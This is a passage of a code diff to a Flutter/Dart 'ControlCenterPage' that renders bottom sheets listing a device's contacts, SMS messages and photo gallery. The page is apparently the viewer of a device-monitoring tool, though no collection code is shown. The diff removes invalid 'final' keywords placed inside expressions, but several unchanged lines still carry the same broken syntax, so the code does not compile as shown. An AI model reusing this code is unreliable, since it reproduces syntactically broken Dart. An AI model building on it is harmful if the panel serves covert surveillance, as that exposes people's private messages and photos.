-          Text('Contacts (${contacts.length})', style: final TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
+          Container(height: 4, width: 40, margin: EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
+          Text('Contacts (${contacts.length})', style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
           final SizedBox(height: 8),
-          Expanded(child: ListView.separated(controller: sc, padding: final EdgeInsets.symmetric(horizontal: 16),
+          Expanded(child: ListView.separated(controller: sc, padding: EdgeInsets.symmetric(horizontal: 16),
             itemCount: contacts.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
             itemBuilder: (_, i) => ListTile(
-              contentPadding: final EdgeInsets.symmetric(horizontal: 0, vertical: 2),
+              contentPadding: EdgeInsets.symmetric(horizontal: 0, vertical: 2),
               leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
-                child: final Icon(Icons.person, color: _kAccent, size: 20)),
-              title: Text(contacts[i]['name']?.toString() ?? '-', style: final TextStyle(color: _kText, fontSize: 13)),
-              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: final TextStyle(color: _kTextSecondary, fontSize: 12))),
+                child: Icon(Icons.person, color: _kAccent, size: 20)),
+              title: Text(contacts[i]['name']?.toString() ?? '-', style: TextStyle(color: _kText, fontSize: 13)),
+              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: TextStyle(color: _kTextSecondary, fontSize: 12))),
           )),
         ]),
       ));
@@ -849,22 +849,22 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   void _smsSheet(List sms) {
     showModalBottomSheet(context: context, backgroundColor: _kCard,
       isScrollControlled: true,
-      shape: final RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
+      shape: RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
       builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
         builder: (_, sc) => Column(children: [
-          Container(height: 4, width: 40, margin: final EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
-          Text('SMS (${sms.length})', style: final TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
+          Container(height: 4, width: 40, margin: EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
+          Text('SMS (${sms.length})', style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
           final SizedBox(height: 8),
-          Expanded(child: ListView.separated(controller: sc, padding: final EdgeInsets.symmetric(horizontal: 16),
+          Expanded(child: ListView.separated(controller: sc, padding: EdgeInsets.symmetric(horizontal: 16),
             itemCount: sms.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
             itemBuilder: (_, i) {
               final s = sms[i] as Map;
               return ListTile(
-                contentPadding: final EdgeInsets.symmetric(horizontal: 0, vertical: 4),
+                contentPadding: EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                 leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kCyan.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
-                  child: final Icon(Icons.chat_bubble, color: _kCyan, size: 20)),
-                title: Text(s['address']?.toString() ?? '-', style: final TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
-                subtitle: Text(s['body']?.toString() ?? '', style: final TextStyle(color: _kTextSecondary, fontSize: 12), maxLines: 2, overflow: TextOverflow.ellipsis));
+                  child: Icon(Icons.chat_bubble, color: _kCyan, size: 20)),
+                title: Text(s['address']?.toString() ?? '-', style: TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
+                subtitle: Text(s['body']?.toString() ?? '', style: TextStyle(color: _kTextSecondary, fontSize: 12), maxLines: 2, overflow: TextOverflow.ellipsis));
             })),
         ]),
       ));
@@ -873,16 +873,16 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   void _gallerySheet(List imgs) {
     showModalBottomSheet(context: context, backgroundColor: _kCard,
       isScrollControlled: true,
-      shape: final RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
+      shape: RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
       builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
         builder: (_, sc) => Column(children: [
-          Container(height: 4, width: 40, margin: final EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
-          Text('Gallery (${imgs.length})', style: final TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
+          Container(height: 4, width: 40, margin: EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
+          Text('Gallery (${imgs.length})', style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
           final SizedBox(height: 8),
           Expanded(child: imgs.isEmpty
               ? final Center(child: Text('No photos', style: TextStyle(color: _kTextSecondary)))
-              : GridView.builder(controller: sc, padding: final EdgeInsets.all(10),
-                  gridDelegate: final SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
+              : GridView.builder(controller: sc, padding: EdgeInsets.all(10),
+                  gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
                   itemCount: imgs.length,
                   itemBuilder: (_, i) {
                     try {
@@ -905,9 +905,9 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   Widget get _gap => const SizedBox(height: 12);
 
   Widget _sectionHeader(String title, String subtitle) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-    Text(title, style: final TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
+    Text(title, style: TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
     final SizedBox(height: 4),
-    Text(subtitle, style: final TextStyle(color: _kTextSecondary, fontSize: 12)),
+    Text(subtitle, style: TextStyle(color: _kTextSecondary, fontSize: 12)),
     final SizedBox(height: 8),
     Container(height: 1, color: _kBorder),
   ]);
@@ -915,25 +915,25 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   Widget _actionBtn(String label, Color color, IconData icon, VoidCallback fn) =>
     InkWell(onTap: fn, borderRadius: BorderRadius.circular(10),
       child: Container(
-        padding: final EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+        padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
         decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBorder, width: 0.5)),
         child: Row(children: [
           Container(width: 36, height: 36, decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
             child: Icon(icon, color: color, size: 18)),
           final SizedBox(width: 14),
-          Expanded(child: Text(label, style: final TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w500))),
+          Expanded(child: Text(label, style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w500))),
           Icon(Icons.chevron_right, color: _kTextSecondary, size: 20),
         ]),
       ),
     );
 
   Widget _infoRow(String num, String text) => Padding(
-    padding: final EdgeInsets.symmetric(vertical: 4),
+    padding: EdgeInsets.symmetric(vertical: 4),
     child: Row(children: [
       Container(width: 22, height: 22, decoration: BoxDecoration(color: _kWarning.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
-        child: Center(child: Text(num, style: final TextStyle(color: _kWarning, fontSize: 10, fontWeight: FontWeight.w600)))),
+        child: Center(child: Text(num, style: TextStyle(color: _kWarning, fontSize: 10, fontWeight: FontWeight.w600)))),
       final SizedBox(width: 12),
-      Expanded(child: Text(text, style: final TextStyle(color: _kTextSecondary, fontSize: 11))),
+      Expanded(child: Text(text, style: TextStyle(color: _kTextSecondary, fontSize: 11))),
     ]),
   );
 
@@ -941,14 +941,14 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     TextField(
       controller: ctrl,
       keyboardType: isNum ? TextInputType.number : TextInputType.text,
-      style: final TextStyle(color: _kText, fontSize: 14),
+      style: TextStyle(color: _kText, fontSize: 14),
       decoration: InputDecoration(
         labelText: label,
         hintText: hint,
-        labelStyle: final TextStyle(color: _kTextSecondary, fontSize: 12),
-        hintStyle: final TextStyle(color: _kTextSecondary, fontSize: 12),
+        labelStyle: TextStyle(color: _kTextSecondary, fontSize: 12),
+        hintStyle: TextStyle(color: _kTextSecondary, fontSize: 12),
         filled: true, fillColor: _kBg,
-        contentPadding: final EdgeInsets.symmetric(horizontal: 12, vertical: 10),
+        contentPadding: EdgeInsets.symmetric(horizontal: 12, vertical: 10),
         border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBorder)),
         enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kBorder)),
         focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: _kAccent)),
